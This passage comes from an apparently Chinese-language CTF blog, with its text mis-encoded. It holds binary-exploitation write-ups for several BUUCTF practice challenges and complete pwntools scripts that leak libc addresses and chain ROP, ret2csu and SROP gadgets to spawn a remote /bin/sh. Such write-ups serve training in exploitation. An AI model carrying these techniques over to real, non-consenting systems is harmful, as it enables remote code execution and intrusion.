<h2 id="è§£æ³•1ï¼šret2csu"><a href="#è§£æ³•1ï¼šret2csu" class="headerlink" title="è§£æ³•1ï¼šret2csu"></a>è§£æ³•1ï¼šret2csu</h2><p>è€ƒè™‘åˆ°å­˜åœ¨<strong>59å·ç³»ç»Ÿè°ƒç”¨execve</strong>ï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾é€šè¿‡<code>execve(&quot;/bin/sh&quot;,0,0)</code>ä»¥getshell</p>
<p>æ–‡ä»¶ä¸­ä¸å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²ï¼Œç”±äºæ ˆåŸºå€å¯çŸ¥ï¼Œæ•…è€ƒè™‘æ‰‹åŠ¨è¾“å…¥åˆ°æ ˆä¸Š</p>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨csuä¸­çš„gadgetå…ˆå°†r13ã€r14ç½®ä¸º0ï¼Œä¹‹åå†<code>mov rdx,r13;mov rsi,r14</code>å°†rsiå’Œrdxç½®ä¸º0</p>
<p>ç”±äºè¿™ä¸ªgadgetè¿è¡Œåˆ°åé¢ä¼šæ‰§è¡Œ<code>call [r12 + 8*rsp]</code>ï¼ˆrspå·²è¢«ç½®0ï¼Œæ•…å®é™…æ•ˆæœæ˜¯æ‰§è¡Œ```call [r12]``ï¼‰ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦åœ¨r12å†…æ”¾å…¥ä¸€ä¸ªå­˜æœ‰é€‚åˆæŒ‡ä»¤çš„åœ°å€çš„åœ°å€ï¼Œè¿™é‡Œç”±äºæ­¤å‰æˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ªå¸¦æœ‰retçš„gadgetçš„åœ°å€åå°†r12ç½®ä¸ºè¯¥æ ˆä¸Šåœ°å€å³å¯ç»§ç»­æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œ<strong>éœ€è¦æ³¨æ„çš„æ˜¯callæŒ‡ä»¤ä¼šå¾€æ ˆä¸Šå‹å…¥å½“å‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†ä¹‹å¼¹å‡ºæ ˆ</strong></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = <span class="number">0x400580</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28147</span>)<span class="comment">#process('./ciscn_s_3')# </span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">sh_addr = stack_addr + <span class="number">8</span></span><br><span class="line">log.info(hex(sh_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 =  p64(pop_rdi_ret) + <span class="string">b'/bin/sh\x00'</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12)</span><br><span class="line">payload2 += p64(mov_rax_59_ret) + p64(pop_rdi_ret) + p64(sh_addr)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png" alt="image.png"></p>
<h2 id="è§£æ³•2ï¼šSROP"><a href="#è§£æ³•2ï¼šSROP" class="headerlink" title="è§£æ³•2ï¼šSROP"></a>è§£æ³•2ï¼šSROP</h2><blockquote>
<p><del>è¯•äº†å¥½å‡ ç§å§¿åŠ¿éƒ½æ²¡å¼„å‡ºæ¥ï¼Œç¦»è°±</del></p>
<p><del>éš¾é“SROPé€€å‡ºå†å²èˆå°äº†ğŸ</del></p>
<p>æ˜¯æˆ‘å‚»äº†ï¼Œæˆ‘ç»™å¼„æˆstr().encode()äº†ï¼Œåº”è¯¥ç”¨bytes()â€¦</p>
<p><del>æ—©çŸ¥é“è‡ªå·±æ‰‹æ’•ä¸€ä¸ªframeå¯èƒ½è¿˜å¥½ç‚¹</del></p>
</blockquote>
<p>å‰é¢çš„è§£æ³•æˆ‘ä»¬ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„59å·ç³»ç»Ÿè°ƒç”¨<code>execve</code>ï¼Œè¿™ä¸ªè§£æ³•åˆ™æ˜¯ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„å¦å¤–ä¸€ä¸ª15å·ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code></p>
<p>ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code>ç”¨äºæ¢å¤ç”¨æˆ·æ€çš„å¯„å­˜å™¨çŠ¶æ€ï¼Œä»æ ˆä¸Šä¿å­˜çš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€</p>
<p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå°†å½“å‰è¿›ç¨‹çš„å¯„å­˜å™¨çŠ¶æ€å‹å…¥æ ˆä¸­ï¼Œå°†<code>rt_sigreturn</code>ä½œä¸ºè¿”å›åœ°å€ä¸€å¹¶å‹å…¥ï¼›ä»å†…æ ¸æ€åˆ‡å›ç”¨æˆ·æ€æ—¶ä¾¿é€šè¿‡æ ˆä¸Šçš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ï¼Œå¤§è‡´å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p>
<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ªSigreturnFrameæ‰§è¡Œexecve(â€œ/bin/shâ€,0,0)å³å¯</p>
<p>ä½¿ç”¨pwntoolsä¸­çš„SigreturnFrameå·¥å…·å¯ä»¥å¿«é€Ÿæ„é€ ä¸€ä¸ª fake frame</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p =remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26063</span>)<span class="comment"># process('./ciscn_s_3') # </span></span><br><span class="line">e = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">payload1 = <span class="string">b'A'</span> * <span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">"stack addr: "</span> + hex(stack_leak))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = stack_leak</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">payload2 = <span class="string">b'/bin/sh\x00'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(mov_rax_15_ret) + p64(syscall_addr) + bytes(frame)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png" alt="image.png"></p>
<blockquote>
<p>SROP(Sigreturn Oriented Programming)æŠ€æœ¯åˆ©ç”¨äº†ç±»Unixç³»ç»Ÿä¸­çš„Signalæœºåˆ¶ï¼Œå¦‚å›¾ï¼š</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" alt="img"></a></p>
<ol>
<li>å½“ä¸€ä¸ªç”¨æˆ·å±‚è¿›ç¨‹å‘èµ·signalæ—¶ï¼Œæ§åˆ¶æƒåˆ‡åˆ°å†…æ ¸å±‚</li>
<li>å†…æ ¸ä¿å­˜è¿›ç¨‹çš„ä¸Šä¸‹æ–‡(å¯¹æˆ‘ä»¬æ¥è¯´é‡è¦çš„å°±æ˜¯å¯„å­˜å™¨çŠ¶æ€)åˆ°ç”¨æˆ·çš„æ ˆä¸Šï¼Œç„¶åå†æŠŠrt_sigreturnåœ°å€å‹æ ˆï¼Œè·³åˆ°ç”¨æˆ·å±‚æ‰§è¡ŒSignal Handlerï¼Œå³è°ƒç”¨rt_sigreturn</li>
<li>rt_sigreturnæ‰§è¡Œå®Œï¼Œè·³åˆ°å†…æ ¸å±‚</li>
<li>å†…æ ¸æ¢å¤â‘¡ä¸­ä¿å­˜çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·å±‚è¿›ç¨‹</li>
</ol>
<p><a href="https://xz.aliyun.com/t/5240" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº-SROP exploit</a></p>
</blockquote>
<h1 id="0x018-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc"><a href="#0x018-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc" class="headerlink" title="0x018.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc"></a>0x018.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png" alt="image.png"></p>
<p>æ‹–å…¥IDAåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png" alt="image.png"></p>
<p>ç›´æ¥ç»™äº†ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾å…ˆæ³„éœ²readå‡½æ•°çœŸå®åœ°å€å†ä½¿ç”¨LibcSearcherå¯»æ‰¾Libcç‰ˆæœ¬æœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28409)#process(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">e &#x3D; ELF(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">offset &#x3D; 0x88</span><br><span class="line">read_got &#x3D; e.got[&#39;read&#39;]</span><br><span class="line">write_plt &#x3D; e.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; offset * b&#39;A&#39; + p32(0xdeadbeef) + p32(write_plt) + p32(0x8048474) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_str &#x3D; p.recv(4).ljust(4,b&#39;\x00&#39;)</span><br><span class="line">print(read_str)</span><br><span class="line">read_addr &#x3D; u32(read_str)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">sys_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">sh_addr &#x3D; libc_base  + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; offset * b&#39;A&#39; + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png" alt="image.png"></p>
<h1 id="0x019-bjdctf-2020-babyrop-ret2csu-ret2libc"><a href="#0x019-bjdctf-2020-babyrop-ret2csu-ret2libc" class="headerlink" title="0x019.bjdctf_2020_babyrop - ret2csu + ret2libc"></a>0x019.bjdctf_2020_babyrop - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œåªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png" alt="image.png"></p>
<p>å¯ä»¥å‘ç°åœ¨<code>vuln()</code>å‡½æ•°å¤„å­˜åœ¨æ ˆæº¢å‡º</p>
<p>ç”±äºæ²¡æœ‰åé¢å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28167</span>) <span class="comment"># p = process('./bjdctf_2020_babyrop') # </span></span><br><span class="line">e = ELF(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b'A'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">'vuln'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_str = p.recvuntil(<span class="string">b'\nPull up'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">print(puts_str)</span><br><span class="line">puts_addr = u64(puts_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b'A'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png" alt="image.png"></p>
<h1 id="0x01A-pwn2-sctf-2016-integer-overflow-ret2libc"><a href="#0x01A-pwn2-sctf-2016-integer-overflow-ret2libc" class="headerlink" title="0x01A.pwn2_sctf_2016 - integer overflow + ret2libc"></a>0x01A.pwn2_sctf_2016 - integer overflow + ret2libc</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p>![0QJ_UK7O_A2KJOURYNP`_KW.png](<a href="https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png</a>)</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>vuln()</code>å‡½æ•°ä¸­ä½¿ç”¨<code>get_n()</code>å‡½æ•°è¯»å…¥4å­—èŠ‚å¹¶ä½¿ç”¨<code>atoi()</code>è½¬ä¸ºæ•°å­—ï¼Œè‹¥æ˜¯å¤§äº32åˆ™é€€å‡ºï¼Œå¦åˆ™å†ä¸€æ¬¡è°ƒç”¨<code>get_n()</code>å‡½æ•°è¿›è¡Œè¯»å…¥</p>
<p>![A`GN6_COM3ZZ5BGCO0P1~AK.png](<a href="https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png</a>)</p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>get_n()</code>å‡½æ•°ä¸­ï¼Œå…¶æ‰€æ¥æ”¶çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>unsigned int</code>ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¯»å…¥æ•°å­—<code>-1</code>åˆ™ä¼šå‘ç”Ÿæ•´æ•°æº¢å‡ºå˜æˆä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œä¾¿å­˜åœ¨æº¢å‡ºç‚¹äº†</p>
<p><img src="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png" alt="SH@J5_XNE_9R_DEH0R_A_T0.png"></p>
<p>æ–‡ä»¶æœ¬èº«ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼ˆå¹¶ä¸”é™„èµ äº†ä¸€å †æ²¡ç”¨çš„gadgetï¼‰ï¼Œæ•…è€ƒè™‘<strong>ret2libc</strong>ï¼Œé¦–å…ˆæ³„æ¼å‡ºprintfå‡½æ•°åœ°å€ï¼Œå†ä½¿ç”¨LibcSearcherå¾—åˆ°libcï¼Œæœ€åæ„é€ <code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>ç¨‹åºä¸­å­˜åœ¨<code>%s</code>å­—ç¬¦ä¸²ä¾›æ‰“å°</p>
<p><img src="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png" alt="1__H@0HQW54N_D27DI_SM_3.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./pwn2_sctf_2016'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line">fmtstr_addr = <span class="number">0x8048702</span></span><br><span class="line">printf_got = e.got[<span class="string">'printf'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29032</span>)</span><br><span class="line">p.sendline(<span class="string">b'-1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b'You said'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">'printf'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) +  <span class="number">5</span>*p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b'-1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png" alt="E@O1G4DY_S2_DR_2J_0E__O.png"></p>
<h1 id="0x01B-others-shellcode"><a href="#0x01B-others-shellcode" class="headerlink" title="0x01B.others_shellcode"></a>0x01B.others_shellcode</h1><p>ç›´æ¥è¿æ¥å°±æœ‰flagäº†â€¦</p>
<p><img src="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png" alt="image.png"></p>
<h1 id="0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><a href="#0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc" class="headerlink" title="0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc"></a>0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸è¿‡æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆä½¿ç”¨printfæ³„éœ²readå‡½æ•°åœ°å€å†ç”¨LibcSearcherå¾—åˆ°libcæœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">fmtstr = <span class="number">0x400790</span></span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(read_got) +p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(fmtstr) + p64(printf_plt) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25106</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">str = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">print(str)</span><br><span class="line">read_addr = u64(str)</span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

